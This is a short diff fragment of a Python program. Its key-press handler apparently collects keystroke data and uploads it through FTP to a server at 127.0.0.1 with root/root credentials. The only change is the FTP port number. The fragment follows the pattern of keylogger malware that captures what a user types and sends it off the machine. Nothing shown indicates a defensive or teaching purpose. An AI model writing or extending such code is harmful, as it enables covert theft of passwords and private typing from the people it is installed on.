@@ -18,7 +18,7 @@ def on_press(key):
             key_press_data=""
             ftp_server = ftplib.FTP()
             ftp_host = "127.0.0.1"
-            ftp_port = 5555
+            ftp_port = 55555
             ftp_server.connect(ftp_host, ftp_port)
             ftp_server.login("root", "root") 
             print(ftp_server.pwd())
